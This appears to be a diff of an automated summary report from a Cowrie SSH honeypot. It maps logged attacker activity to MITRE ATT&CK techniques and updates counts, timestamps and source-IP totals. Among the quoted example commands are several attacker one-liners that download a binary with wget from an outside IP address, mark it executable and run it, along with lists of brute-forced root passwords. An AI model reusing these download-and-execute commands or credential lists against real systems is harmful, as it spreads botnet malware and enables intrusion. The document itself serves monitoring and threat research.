@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-18 21:03:12",
+  "generated": "2026-08-18 22:00:13",
   "totals": {
-    "commands": 8526,
-    "login_failed": 6687,
-    "login_success": 2609,
-    "sessions": 6924
+    "commands": 8726,
+    "login_failed": 7616,
+    "login_success": 2669,
+    "sessions": 7604
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 6687,
+      "count": 7616,
       "examples": [
         "root / 19801024",
         "root / sunsunsun",
@@ -21,14 +21,14 @@
         "root / 826826826"
       ],
       "first": "2026-08-18T00:00:03.054815Z",
-      "last": "2026-08-18T21:03:07.800881Z",
-      "unique_ips": 98
+      "last": "2026-08-18T22:00:10.599543Z",
+      "unique_ips": 106
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 2609,
+      "count": 2669,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123@@@",
@@ -37,14 +37,14 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-18T00:06:39.840434Z",
-      "last": "2026-08-18T21:02:50.860400Z",
-      "unique_ips": 71
+      "last": "2026-08-18T21:53:27.026512Z",
+      "unique_ips": 76
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 244,
+      "count": 257,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -53,14 +53,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T19:40:16.237991Z",
-      "unique_ips": 19
+      "last": "2026-08-18T21:53:22.083822Z",
+      "unique_ips": 20
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 155,
+      "count": 169,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -69,8 +69,8 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T19:40:16.237991Z",
-      "unique_ips": 17
+      "last": "2026-08-18T21:53:22.083822Z",
+      "unique_ips": 18
     },
     {
       "id": "T1082",
@@ -169,28 +169,28 @@
   ],
   "unmapped": [
     [
+      "sh",
+      2590
+    ],
+    [
       "system",
-      2532
+      2589
     ],
     [
       "shell",
-      2532
-    ],
-    [
-      "sh",
-      2532
+      2585
     ],
     [
       "/bin/busybox",
       411
     ],
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      18
+      "enable",
+      23
     ],
     [
-      "enable",
-      17
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      23
     ],
     [
       "linuxshell",
